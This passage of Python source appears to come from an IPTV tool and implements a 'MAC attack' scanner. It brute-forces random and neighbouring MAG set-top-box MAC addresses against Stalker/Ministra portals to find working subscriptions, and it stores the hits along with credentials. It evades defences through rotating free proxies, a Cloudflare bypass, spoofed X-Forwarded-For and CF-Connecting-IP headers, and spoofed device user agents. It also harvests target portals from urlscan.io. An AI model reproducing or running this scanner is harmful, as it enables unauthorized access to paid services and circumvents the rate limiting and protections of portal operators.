"""
MAC Scanner Module
Integriert MacAttack Scanner in MacReplayXC
Full Feature Set from MacAttackWeb-NEW
Storage: Hybrid (Settings in JSON, Hits in SQLite DB)
Performance: DNS Caching, Connection Pooling, Batch Writes, orjson
"""
import threading
import time
import secrets
import random
import os
import json
import sqlite3
import re
import signal
import sys
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import logging
import socket
from functools import lru_cache
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

import stb_scanner

logger = logging.getLogger(__name__)

# ============== PERFORMANCE OPTIMIZATIONS ==============

# 1. DNS Caching (2-5x speedup for same portals)
_original_getaddrinfo = socket.getaddrinfo

@lru_cache(maxsize=1000)
def cached_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
    """Cached DNS lookups to avoid repeated DNS queries"""
    return _original_getaddrinfo(host, port, family, type, proto, flags)

# Monkey-patch socket for DNS caching
socket.getaddrinfo = cached_getaddrinfo
logger.info("DNS caching enabled (1000 entries)")

# 2. HTTP Connection Pooling with Cloudscraper (1.5-5x speedup + Cloudflare bypass)
try:
    import cloudscraper
    http_session = cloudscraper.create_scraper(
        browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
    )
    # Add retry strategy to cloudscraper session
    retry_strategy = Retry(
        total=2,
        backoff_factor=0.1,
        status_forcelist=[429, 500, 502, 503, 504]
    )
    adapter = HTTPAdapter(
        pool_connections=20,
        pool_maxsize=100,
        max_retries=retry_strategy
    )
    http_session.mount("http://", adapter)
    http_session.mount("https://", adapter)
    logger.info("✅ Cloudscraper enabled - Cloudflare bypass active (20 pools, 100 connections)")
except ImportError:
    # Fallback to standard requests if cloudscraper not installed
    http_session = requests.Session()
    retry_strategy = Retry(
        total=2,
        backoff_factor=0.1,
        status_forcelist=[429, 500, 502, 503, 504]
    )
    adapter = HTTPAdapter(
        pool_connections=20,
        pool_maxsize=100,
        max_retries=retry_strategy
    )
    http_session.mount("http://", adapter)
    http_session.mount("https://", adapter)
    logger.info("ℹ️ Cloudscraper not available - install with: pip install cloudscraper")
    logger.info("HTTP connection pooling enabled (20 pools, 100 connections)")

# 3. orjson for fast JSON parsing (5-10x speedup)
try:
    import orjson
    JSON_LOADS = lambda x: orjson.loads(x)
    JSON_DUMPS = lambda x: orjson.dumps(x).decode('utf-8')
    logger.info("Using orjson for fast JSON parsing (10x speedup)")
except ImportError:
    JSON_LOADS = json.loads
    JSON_DUMPS = lambda x: json.dumps(x, indent=2)
    logger.warning("orjson not available, using standard json (consider: pip install orjson)")

# Global state
scanner_attacks = {}
scanner_attacks_lock = threading.Lock()

# Resource limits
MAX_CONCURRENT_SCANS = 10  # Increased from 5 for better parallelism
MAX_RETRY_QUEUE_SIZE = 5000  # Increased from 1000 for larger queues
BATCH_WRITE_SIZE = 100          # Batch DB writes for performance
BATCH_WRITE_INTERVAL = 5        # Flush batch every 5 seconds

# Scanner config file (Settings, Proxies, Sources)
SCANNER_CONFIG_FILE = os.path.join(os.getenv("CONFIG", "/app/data").replace("MacReplayXC.json", ""), "scanner_config.json")

# Scanner database file (Found MACs)
SCANNER_DB_FILE = os.path.join(os.getenv("CONFIG", "/app/data").replace("MacReplayXC.json", ""), "scans.db")

# Default scanner settings
DEFAULT_SCANNER_SETTINGS = {
    "speed": 10,
    "timeout": 10,
    "mac_prefix": "00:1A:79:",
    "auto_save": True,
    "max_proxy_errors": 10,
    "proxy_test_threads": 50,
    "unlimited_mac_retries": True,
    "max_mac_retries": 3,
    "max_proxy_attempts_per_mac": 10,
    "proxy_rotation_percentage": 80,
    "proxy_connect_timeout": 2,
    "require_channels_for_valid_hit": True,
    "min_channels_for_valid_hit": 1,
    "aggressive_phase1_retry": True,
    "request_delay": 0,
    "force_proxy_rotation_every": 0,
    "user_agent_rotation": False,
    "macattack_compatible_mode": False,
    # NEW: Advanced Features
    "cloudflare_bypass": True,
    "random_x_forwarded_for": True,
    "vpn_proxy_detection": False,
    "deduplicate_mac_lists": True,
    "generate_neighbor_macs": False,
    "neighbor_mac_range": 5,
    "auto_refresh_expiring": False,
    "expiring_days_threshold": 7,
    "scheduler_enabled": False,
    "scheduler_start_time": "00:00",
    "scheduler_end_time": "23:59",
}

# Scanner persistent data (Settings only, Hits in DB)
scanner_data = {
    "settings": DEFAULT_SCANNER_SETTINGS.copy(),
    "proxies": [],
    "proxy_sources": [
        "https://spys.me/proxy.txt",
        "https://free-proxy-list.net/",
    ],
}

# Proxy state
proxy_state = {
    "fetching": False,
    "testing": False,
    "proxies": [],
    "working_proxies": [],
    "failed_proxies": [],
    "logs": []
}


# ============== DATABASE MANAGEMENT ==============

def init_scanner_db():
    """Initialize scanner database with performance optimizations"""
    try:
        conn = sqlite3.connect(SCANNER_DB_FILE)
        
        # Performance optimizations
        conn.execute('PRAGMA journal_mode=WAL')        # Write-Ahead Logging (bessere Concurrency)
        conn.execute('PRAGMA synchronous=NORMAL')      # Schneller, aber sicher
        conn.execute('PRAGMA cache_size=-64000')       # 64MB Cache
        conn.execute('PRAGMA temp_store=MEMORY')       # Temp tables in RAM
        
        cursor = conn.cursor()
        
        # Create found_macs table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS found_macs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                mac TEXT NOT NULL,
                portal TEXT NOT NULL,
                portal_type TEXT DEFAULT 'stalker_v1',
                expiry TEXT,
                channels INTEGER DEFAULT 0,
                has_de BOOLEAN DEFAULT 0,
                backend_url TEXT,
                username TEXT,
                password TEXT,
                max_connections INTEGER,
                created_at TEXT,
                client_ip TEXT,
                found_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(mac, portal)
            )
        ''')
        
        # Migration: Add portal_type column if it doesn't exist
        try:
            cursor.execute("SELECT portal_type FROM found_macs LIMIT 1")
        except sqlite3.OperationalError:
            logger.info("Migrating database: Adding portal_type column")
            cursor.execute("ALTER TABLE found_macs ADD COLUMN portal_type TEXT DEFAULT 'stalker_v1'")
            conn.commit()
        
        # Migration: Add VPN/Proxy detection columns if they don't exist
        cursor.execute("PRAGMA table_info(found_macs)")
        columns = [col[1] for col in cursor.fetchall()]
        
        if 'is_vpn' not in columns:
            logger.info("Migrating database: Adding is_vpn column")
            cursor.execute("ALTER TABLE found_macs ADD COLUMN is_vpn BOOLEAN DEFAULT 0")
            conn.commit()
        
        if 'is_proxy' not in columns:
            logger.info("Migrating database: Adding is_proxy column")
            cursor.execute("ALTER TABLE found_macs ADD COLUMN is_proxy BOOLEAN DEFAULT 0")
            conn.commit()
        
        # Create indices for fast queries
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_portal ON found_macs(portal)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_portal_type ON found_macs(portal_type)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_has_de ON found_macs(has_de)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_channels ON found_macs(channels)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_found_at ON found_macs(found_at)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_is_vpn ON found_macs(is_vpn)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_is_proxy ON found_macs(is_proxy)')
        
        # Create genres table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS genres (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                mac_id INTEGER NOT NULL,
                genre TEXT NOT NULL,
                is_de BOOLEAN DEFAULT 0,
                FOREIGN KEY (mac_id) REFERENCES found_macs(id) ON DELETE CASCADE
            )
        ''')
        
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_mac_id ON genres(mac_id)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_is_de ON genres(is_de)')
        
        conn.commit()
        conn.close()
        logger.info("Scanner database initialized")
    except Exception as e:
        logger.error(f"Error initializing scanner database: {e}")


def get_db_connection():
    """Get database connection"""
    conn = sqlite3.connect(SCANNER_DB_FILE)
    conn.row_factory = sqlite3.Row
    return conn


# ============== CONFIG MANAGEMENT ==============

def load_scanner_config():
    """Load scanner config from file (Settings only)"""
    global scanner_data
    try:
        if os.path.exists(SCANNER_CONFIG_FILE):
            with open(SCANNER_CONFIG_FILE, 'r') as f:
                loaded = JSON_LOADS(f.read())
                # Only load settings, proxies, sources (NOT found_macs)
                if "settings" in loaded:
                    scanner_data["settings"] = loaded["settings"]
                if "proxies" in loaded:
                    scanner_data["proxies"] = loaded["proxies"]
                if "proxy_sources" in loaded:
                    scanner_data["proxy_sources"] = loaded["proxy_sources"]
                logger.info("Loaded scanner config")
    except Exception as e:
        logger.error(f"Error loading scanner config: {e}")


def save_scanner_config():
    """Save scanner config to file (Settings only)"""
    try:
        os.makedirs(os.path.dirname(SCANNER_CONFIG_FILE), exist_ok=True)
        with open(SCANNER_CONFIG_FILE, 'w') as f:
            # Only save settings, proxies, sources (NOT found_macs)
            config_to_save = {
                "settings": scanner_data.get("settings", {}),
                "proxies": scanner_data.get("proxies", []),
                "proxy_sources": scanner_data.get("proxy_sources", [])
            }
            f.write(JSON_DUMPS(config_to_save))
        logger.info("Saved scanner config")
    except Exception as e:
        logger.error(f"Error saving scanner config: {e}")


def get_scanner_settings():
    """Get scanner settings"""
    return scanner_data.get("settings", DEFAULT_SCANNER_SETTINGS.copy())


def update_scanner_settings(new_settings):
    """Update scanner settings"""
    scanner_data["settings"].update(new_settings)
    save_scanner_config()


def add_found_mac(hit_data):
    """Add found MAC to database"""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        # Insert or replace MAC
        cursor.execute('''
            INSERT OR REPLACE INTO found_macs 
            (mac, portal, expiry, channels, has_de, backend_url, username, password, 
             max_connections, created_at, client_ip, found_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            hit_data['mac'],
            hit_data['portal'],
            hit_data.get('expiry'),
            hit_data.get('channels', 0),
            hit_data.get('has_de', False),
            hit_data.get('backend_url'),
            hit_data.get('username'),
            hit_data.get('password'),
            hit_data.get('max_connections'),
            hit_data.get('created_at'),
            hit_data.get('client_ip'),
            hit_data.get('found_at', datetime.now().isoformat())
        ))
        
        mac_id = cursor.lastrowid
        
        # Delete old genres
        cursor.execute('DELETE FROM genres WHERE mac_id = ?', (mac_id,))
        
        # Insert genres
        for genre in hit_data.get('genres', []):
            is_de = 'DE' in genre.upper() or 'GERMAN' in genre.upper() or 'DEUTSCH' in genre.upper()
            cursor.execute('''
                INSERT INTO genres (mac_id, genre, is_de)
                VALUES (?, ?, ?)
            ''', (mac_id, genre, is_de))
        
        conn.commit()
        conn.close()
        
        logger.info(f"Added found MAC to database: {hit_data['mac']}")
    except Exception as e:
        logger.error(f"Error adding found MAC to database: {e}")


def get_found_macs(portal=None, min_channels=0, de_only=False, limit=None):
    """Get found MACs from database with optional filters"""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        query = 'SELECT * FROM found_macs WHERE 1=1'
        params = []
        
        if portal:
            query += ' AND portal = ?'
            params.append(portal)
        
        if min_channels > 0:
            query += ' AND channels >= ?'
            params.append(min_channels)
        
        if de_only:
            query += ' AND has_de = 1'
        
        query += ' ORDER BY found_at DESC'
        
        if limit:
            query += ' LIMIT ?'
            params.append(limit)
        
        cursor.execute(query, params)
        rows = cursor.fetchall()
        
        # Convert to dict and add genres
        results = []
        for row in rows:
            hit = dict(row)
            
            # Get genres
            cursor.execute('SELECT genre FROM genres WHERE mac_id = ? ORDER BY is_de DESC', (hit['id'],))
            hit['genres'] = [g[0] for g in cursor.fetchall()]
            
            # Get DE genres
            cursor.execute('SELECT genre FROM genres WHERE mac_id = ? AND is_de = 1', (hit['id'],))
            hit['de_genres'] = [g[0] for g in cursor.fetchall()]
            
            # Remove internal id
            del hit['id']
            
            results.append(hit)
        
        conn.close()
        return results
    except Exception as e:
        logger.error(f"Error getting found MACs from database: {e}")
        return []


def get_found_macs_stats():
    """Get statistics about found MACs"""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT 
                COUNT(*) as total_hits,
                COUNT(DISTINCT portal) as unique_portals,
                SUM(CASE WHEN has_de = 1 THEN 1 ELSE 0 END) as de_hits,
                AVG(channels) as avg_channels,
                MAX(channels) as max_channels,
                MIN(found_at) as first_hit,
                MAX(found_at) as last_hit
            FROM found_macs
        ''')
        
        row = cursor.fetchone()
        stats = dict(row) if row else {}
        
        conn.close()
        return stats
    except Exception as e:
        logger.error(f"Error getting found MACs stats: {e}")
        return {}


def get_portals_list():
    """Get list of unique portals"""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT portal, COUNT(*) as hits
            FROM found_macs
            GROUP BY portal
            ORDER BY hits DESC
        ''')
        
        portals = [{"portal": row[0], "hits": row[1]} for row in cursor.fetchall()]
        
        conn.close()
        return portals
    except Exception as e:
        logger.error(f"Error getting portals list: {e}")
        return []


def clear_found_macs():
    """Clear all found MACs from database"""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('DELETE FROM found_macs')
        cursor.execute('DELETE FROM genres')
        
        conn.commit()
        conn.close()
        
        logger.info("Cleared all found MACs from database")
    except Exception as e:
        logger.error(f"Error clearing found MACs: {e}")


# ============== BATCH WRITER FOR PERFORMANCE ==============

class BatchWriter:
    """Batch writer for database inserts (10-50x faster than individual writes)"""
    
    def __init__(self, batch_size=BATCH_WRITE_SIZE, flush_interval=BATCH_WRITE_INTERVAL):
        self.batch = []
        self.batch_size = batch_size
        self.flush_interval = flush_interval
        self.last_flush = time.time()
        self.lock = threading.Lock()
        self.total_written = 0
        logger.info(f"Batch writer initialized (size={batch_size}, interval={flush_interval}s)")
    
    def add(self, hit_data):
        """Add hit to batch (will auto-flush when full or timeout)"""
        with self.lock:
            self.batch.append(hit_data)
            
            # Auto-flush if batch full or timeout
            if len(self.batch) >= self.batch_size or \
               time.time() - self.last_flush > self.flush_interval:
                self.flush()
    
    def flush(self):
        """Write batch to database"""
        if not self.batch:
            return
        
        batch_to_write = self.batch.copy()
        self.batch.clear()
        self.last_flush = time.time()
        
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            
            # Begin transaction for batch
            cursor.execute('BEGIN TRANSACTION')
            
            for hit_data in batch_to_write:
                # Insert MAC
                cursor.execute('''
                    INSERT OR REPLACE INTO found_macs 
                    (mac, portal, portal_type, expiry, channels, has_de, backend_url, username, password, 
                     max_connections, created_at, client_ip, found_at)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    hit_data['mac'],
                    hit_data['portal'],
                    hit_data.get('portal_type', 'stalker_v1'),
                    hit_data.get('expiry'),
                    hit_data.get('channels', 0),
                    hit_data.get('has_de', False),
                    hit_data.get('backend_url'),
                    hit_data.get('username'),
                    hit_data.get('password'),
                    hit_data.get('max_connections'),
                    hit_data.get('created_at'),
                    hit_data.get('client_ip'),
                    hit_data.get('found_at', datetime.now().isoformat())
                ))
                
                mac_id = cursor.lastrowid
                
                # Delete old genres
                cursor.execute('DELETE FROM genres WHERE mac_id = ?', (mac_id,))
                
                # Insert genres (batch)
                genres_data = []
                for genre in hit_data.get('genres', []):
                    is_de = 'DE' in genre.upper() or 'GERMAN' in genre.upper() or 'DEUTSCH' in genre.upper()
                    genres_data.append((mac_id, genre, is_de))
                
                if genres_data:
                    cursor.executemany('''
                        INSERT INTO genres (mac_id, genre, is_de)
                        VALUES (?, ?, ?)
                    ''', genres_data)
            
            cursor.execute('COMMIT')
            self.total_written += len(batch_to_write)
            logger.info(f"Batch flushed: {len(batch_to_write)} hits written (total: {self.total_written})")
            
            conn.close()
        except Exception as e:
            logger.error(f"Batch write error: {e}")
            try:
                cursor.execute('ROLLBACK')
            except:
                pass
    
    def __del__(self):
        """Flush remaining batch on cleanup"""
        self.flush()


# Global batch writer instance
batch_writer = BatchWriter()


# Initialize database and load config on module import
init_scanner_db()
load_scanner_config()


# ============== RESOURCE MANAGEMENT ==============

def cleanup_old_attacks():
    """Remove old/finished attacks from memory to prevent memory leaks"""
    with scanner_attacks_lock:
        current_time = time.time()
        to_remove = []
        
        for attack_id, state in scanner_attacks.items():
            # Remove attacks that finished more than 1 hour ago
            if not state["running"] and current_time - state["start_time"] > 3600:
                to_remove.append(attack_id)
        
        for attack_id in to_remove:
            del scanner_attacks[attack_id]
            logger.info(f"Cleaned up old attack: {attack_id}")
    
    # Schedule next cleanup in 5 minutes
    threading.Timer(300, cleanup_old_attacks).start()


# Start cleanup timer
cleanup_old_attacks()


# ============== PROXY SCORER ==============

class ProxyScorer:
    """Track proxy performance for smart rotation"""
    
    def __init__(self):
        self.lock = threading.Lock()
        self.scores = {}
        self.round_robin_index = 0
    
    def _init_proxy(self, proxy):
        if proxy not in self.scores:
            self.scores[proxy] = {
                "speed": 5000,
                "success": 0,
                "fail": 0,
                "slow": 0,
                "blocked": set(),
                "last_used": 0,
                "consecutive_fails": 0
            }
    
    def record_success(self, proxy, response_time_ms):
        """Record successful request"""
        with self.lock:
            self._init_proxy(proxy)
            s = self.scores[proxy]
            if s["success"] > 0:
                s["speed"] = s["speed"] * 0.7 + response_time_ms * 0.3
            else:
                s["speed"] = response_time_ms
            s["success"] += 1
            s["consecutive_fails"] = 0
    
    def record_fail(self, proxy, error_type, portal=None):
        """Record failed request"""
        with self.lock:
            self._init_proxy(proxy)
            s = self.scores[proxy]
            s["fail"] += 1
            s["consecutive_fails"] += 1
            
            if error_type == "slow":
                s["slow"] += 1
                s["speed"] = min(s["speed"] * 1.1, 15000)
            elif error_type == "blocked" and portal:
                s["blocked"].add(portal)
            elif error_type == "dead":
                s["speed"] = min(s["speed"] * 1.3, 20000)
    
    def get_next_proxy(self, proxies, portal=None, max_errors=10, rotation_percentage=80):
        """Smart proxy rotation"""
        with self.lock:
            valid = []
            for p in proxies:
                self._init_proxy(p)
                s = self.scores[p]
                
                if portal and portal in s["blocked"]:
                    continue
                if s["consecutive_fails"] >= max_errors:
                    continue
                
                score = self._get_score(p, portal)
                if score < float('inf'):
                    valid.append((p, score))
            
            if not valid:
                return None
            
            valid.sort(key=lambda x: x[1])
            top_count = max(5, int(len(valid) * rotation_percentage / 100))
            top_proxies = valid[:top_count]
            
            self.round_robin_index = (self.round_robin_index + 1) % len(top_proxies)
            chosen = top_proxies[self.round_robin_index][0]
            self.scores[chosen]["last_used"] = time.time()
            
            return chosen
    
    def _get_score(self, proxy, portal=None):
        """Calculate proxy score (lower = better)"""
        if proxy not in self.scores:
            return 5000
        
        s = self.scores[proxy]
        if portal and portal in s["blocked"]:
            return float('inf')
        if s["consecutive_fails"] >= 10:
            return float('inf')
        
        score = s["speed"]
        total = s["success"] + s["fail"]
        if total > 0:
            fail_rate = s["fail"] / total
            score *= (1 + fail_rate * 2)
        
        if s["slow"] > 3:
            score *= 1.5
        
        return score
    
    def get_working_count(self, proxies, portal=None, max_errors=10):
        """Count how many proxies are still working"""
        count = 0
        with self.lock:
            for p in proxies:
                if p not in self.scores:
                    count += 1
                    continue
                s = self.scores[p]
                if portal and portal in s["blocked"]:
                    continue
                if s["consecutive_fails"] >= max_errors:
                    continue
                count += 1
        return count
    
    def rehabilitate_dead_proxies(self, max_age_minutes=10):
        """Reset proxies that have been 'dead' for too long"""
        with self.lock:
            current_time = time.time()
            rehabilitated = 0
            for proxy, s in self.scores.items():
                if (s["consecutive_fails"] >= 10 and
                    current_time - s.get("last_used", 0) > max_age_minutes * 60):
                    s["consecutive_fails"] = 3
                    s["speed"] = min(s["speed"], 15000)
                    rehabilitated += 1
            return rehabilitated
    
    def get_stats(self, portal=None):
        """Get proxy statistics"""
        with self.lock:
            total = len(self.scores)
            active = 0
            blocked = 0
            dead = 0
            
            for s in self.scores.values():
                if portal and portal in s["blocked"]:
                    blocked += 1
                elif s["consecutive_fails"] >= 10:
                    dead += 1
                else:
                    active += 1
            
            return {"total": total, "active": active, "blocked": blocked, "dead": dead}
    
    def reset(self):
        """Reset all scores"""
        with self.lock:
            self.scores.clear()
            self.round_robin_index = 0
    
    def reset_consecutive_fails(self):
        """Reset consecutive fails (for resume after pause)"""
        with self.lock:
            for s in self.scores.values():
                s["consecutive_fails"] = 0


# Global proxy scorer
proxy_scorer = ProxyScorer()


# ============== SCANNER FUNCTIONS ==============

def generate_mac(prefix="00:1A:79:"):
    """Generate random MAC address"""
    suffix = ":".join([f"{random.randint(0, 255):02X}" for _ in range(3)])
    return f"{prefix}{suffix}"


def generate_neighbor_macs(base_mac, range_size=5):
    """Generate neighbor MACs around a base MAC.
    
    Example:
        base_mac = "00:1A:79:00:00:67"
        range_size = 2
        Returns: ["00:1A:79:00:00:65", "00:1A:79:00:00:66", "00:1A:79:00:00:67", 
                  "00:1A:79:00:00:68", "00:1A:79:00:00:69"]
    """
    def mac_to_int(mac):
        return int(mac.replace(":", ""), 16)
    
    def int_to_mac(num):
        hex_str = f"{num:012X}"
        return ":".join([hex_str[i:i+2] for i in range(0, 12, 2)])
    
    base_int = mac_to_int(base_mac)
    neighbors = []
    
    for offset in range(-range_size, range_size + 1):
        neighbor_int = base_int + offset
        if neighbor_int >= 0:  # Ensure non-negative
            neighbors.append(int_to_mac(neighbor_int))
    
    return neighbors


def generate_random_ip():
    """Generate random IP address for X-Forwarded-For header"""
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"


def get_cloudflare_headers(use_cloudflare_bypass=True, use_random_ip=True):
    """Get Cloudflare bypass headers
    
    Based on FoxyMACScan CFR feature:
    - Cloudflare-specific headers
    - Random X-Forwarded-For IP
    - Browser-like headers
    """
    headers = {}
    
    if use_cloudflare_bypass:
        # Cloudflare bypass headers (from FoxyMACScan)
        headers.update({
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9,de;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Cache-Control": "max-age=0",
            "TE": "trailers",
        })
    
    if use_random_ip:
        # Random X-Forwarded-For to bypass IP-based rate limiting
        headers["X-Forwarded-For"] = generate_random_ip()
        headers["X-Real-IP"] = generate_random_ip()
        headers["CF-Connecting-IP"] = generate_random_ip()
    
    return headers


def deduplicate_mac_list(mac_list):
    """Remove duplicate MACs while preserving order"""
    seen = set()
    result = []
    for mac in mac_list:
        mac_normalized = mac.upper().strip()
        if mac_normalized and mac_normalized not in seen:
            seen.add(mac_normalized)
            result.append(mac_normalized)
    return result


def generate_mac_range(start_mac, end_mac):
    """Generate list of MACs from start to end range.
    
    Example:
        start_mac = "00:1A:79:00:00:00"
        end_mac = "00:1A:79:00:00:FF"
        Returns: ["00:1A:79:00:00:00", "00:1A:79:00:00:01", ..., "00:1A:79:00:00:FF"]
    """
    def mac_to_int(mac):
        """Convert MAC address to integer"""
        return int(mac.replace(":", ""), 16)
    
    def int_to_mac(num):
        """Convert integer to MAC address"""
        hex_str = f"{num:012X}"
        return ":".join([hex_str[i:i+2] for i in range(0, 12, 2)])
    
    start_int = mac_to_int(start_mac)
    end_int = mac_to_int(end_mac)
    
    if start_int > end_int:
        raise ValueError(f"start_mac ({start_mac}) must be <= end_mac ({end_mac})")
    
    # Limit range to prevent memory issues (max 1 million MACs)
    range_size = end_int - start_int + 1
    if range_size > 1_000_000:
        raise ValueError(f"MAC range too large: {range_size:,} MACs (max: 1,000,000)")
    
    return [int_to_mac(i) for i in range(start_int, end_int + 1)]


def crawl_portals_urlscan():
    """Crawl new portals from urlscan.io API.
    
    Returns: List of portal URLs found
    """
    try:
        base_url = "https://urlscan.io/api/v1/search/?q=filename%3A%22portal.php%3Ftype%3Dstb%26action%3Dhandshake%26token%3D%26prehash%3D0%26JsHttpRequest%3D1-xml%22"
        
        response = http_session.get(base_url, timeout=10)
        response.raise_for_status()
        data = response.json()
        
        portals = []
        for entry in data.get('results', []):
            if 'page' in entry and entry['page'].get('status') == "200":
                url = entry['page']['url']
                # Convert https to http
                url = url.replace("https://", "http://")
                portals.append(url)
        
        # Deduplicate
        portals = list(set(portals))
        
        logger.info(f"✅ Found {len(portals)} portals from urlscan.io")
        return portals
    
    except Exception as e:
        logger.error(f"❌ Portal crawl failed: {e}")
        return []


def detect_vpn_proxy(portal_url, timeout=5):
    """Detect if portal is behind VPN/Proxy using IP-API.com.
    
    Returns: {
        "is_vpn": bool,
        "is_proxy": bool,
        "provider": str or None,
        "confidence": float (0-1)
    }
    """
    from urllib.parse import urlparse
    
    hostname = urlparse(portal_url).hostname
    
    try:
        # IP-API.com (free, includes VPN/Proxy detection)
        resp = http_session.get(
            f"http://ip-api.com/json/{hostname}?fields=status,proxy,hosting",
            timeout=timeout
        )
        data = resp.json()
        
        if data.get("status") == "success":
            is_proxy = data.get("proxy", False)
            is_hosting = data.get("hosting", False)
            
            return {
                "is_vpn": is_hosting,  # Hosting = likely VPN/VPS
                "is_proxy": is_proxy,
                "provider": None,
                "confidence": 0.8 if (is_proxy or is_hosting) else 0.9
            }
    except Exception as e:
        logger.debug(f"VPN detection failed for {hostname}: {e}")
    
    # Fallback: Unknown
    return {
        "is_vpn": False,
        "is_proxy": False,
        "provider": None,
        "confidence": 0.0
    }


def auto_detect_portal_url(base_url, proxy=None, timeout=5):
    """Auto-detect portal endpoint (from MacAttackWeb-NEW).
    
    Tries common portal endpoints:
    - /c/version.js (Ministra/MAG)
    - /stalker_portal/c/version.js (Stalker)
    
    Returns: (detected_url, portal_type, version)
    """
    from urllib.parse import urlparse
    
    base_url = base_url.rstrip('/')
    parsed = urlparse(base_url)
    host = parsed.hostname
    port = parsed.port or 80
    scheme = parsed.scheme or "http"
    
    # If already has /c in path, return as-is
    if '/c' in parsed.path:
        return base_url, "ministra", "5.3.1"
    
    clean = f"{scheme}://{host}:{port}"
    proxies = {"http": proxy, "https": proxy} if proxy else None
    
    # Try common endpoints
    endpoints = [
        ("/c/", "ministra"),
        ("/stalker_portal/c/", "stalker"),
    ]
    
    for endpoint, portal_type in endpoints:
        try:
            resp = http_session.get(
                f"{clean}{endpoint}version.js",
                proxies=proxies,
                timeout=timeout,
                verify=False
            )
            if resp.status_code == 200 and "var ver" in resp.text:
                # Extract version
                match = re.search(r"var ver = ['\"](.+?)['\"]", resp.text)
                version = match.group(1) if match else "5.3.1"
                detected_url = f"{clean}{endpoint.rstrip('/')}"
                logger.info(f"✅ Auto-detected portal: {detected_url} (Type: {portal_type}, Version: {version})")
                return detected_url, portal_type, version
        except Exception as e:
            logger.debug(f"Endpoint {endpoint} failed: {e}")
            continue
    
    # Default fallback
    logger.warning(f"⚠️ Could not auto-detect portal, using default: {clean}/c")
    return f"{clean}/c", "ministra", "5.3.1"


def detect_portal_type(portal_url, response_text=None):
    """Auto-detect portal type based on URL and response.
    
    Returns: portal_type (str) - One of:
        - stalker_v1: Standard Stalker portal.php
        - stalker_v2: Stalker stalker_portal/server/load.php
        - stalker_v3: Stalker with signature/metrics
        - xtream: Xtream Codes (Username/Password) - SKIP
        - xui: XUI Panel (Username/Password) - SKIP
        - ministra: Ministra TV Platform
        - flussonic: Flussonic Media Server
        - tvip: TVIP Middleware
        - infomir: Infomir MAG Portal
        - smartiptv: Smart IPTV Portal
        - ottplayer: OTT Player Portal
        - unknown: Cannot determine
    
    Note: Only MAC-based portals (Stalker variants, Ministra, etc.) are supported.
          Xtream/XUI use Username/Password and are skipped.
    """
    url_lower = portal_url.lower()
    
    # Check for non-MAC portals (skip these)
    if "player_api.php" in url_lower:
        return "xtream"  # Username/Password based
    elif "panel_api.php" in url_lower:
        return "xui"  # Username/Password based
    
    # Check for Stalker variants (MAC-based)
    if "stalker_portal" in url_lower:
        return "stalker_v2"
    elif "portal.php" in url_lower or "/c/" in url_lower:
        # Check response to differentiate v1 vs v3
        if response_text:
            if "signature" in response_text or "metrics" in response_text:
                return "stalker_v3"
        return "stalker_v1"
    
    # Check for other MAC-based portals
    if "ministra" in url_lower or "middleware" in url_lower:
        return "ministra"
    elif "flussonic" in url_lower:
        return "flussonic"
    elif "tvip" in url_lower:
        return "tvip"
    elif "infomir" in url_lower or "mag" in url_lower:
        return "infomir"
    elif "smartiptv" in url_lower or "siptv" in url_lower:
        return "smartiptv"
    elif "ottplayer" in url_lower or "ott" in url_lower:
        return "ottplayer"
    
    return "unknown"


def get_portal_config(portal_type):
    """Get portal-specific configuration (headers, cookies, etc).
    
    Based on OpenBullet2's 45 portal configurations with optimized handshake settings.
    
    Returns: dict with portal-specific settings
    """
    configs = {
        # Stalker Variants
        "stalker_v1": {
            "endpoint": "portal.php",
            "user_agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
            "requires_signature": False,
            "requires_metrics": False,
            "headers": {
                "X-User-Agent": "Model: MAG250; Link: WiFi",
            }
        },
        "stalker_v2": {
            "endpoint": "stalker_portal/server/load.php",
            "user_agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 2 rev: 250 Safari/533.3",
            "requires_signature": False,
            "requires_metrics": False,
            "headers": {
                "X-User-Agent": "Model: MAG250; Link: Ethernet",
            }
        },
        "stalker_v3": {
            "endpoint": "portal.php",
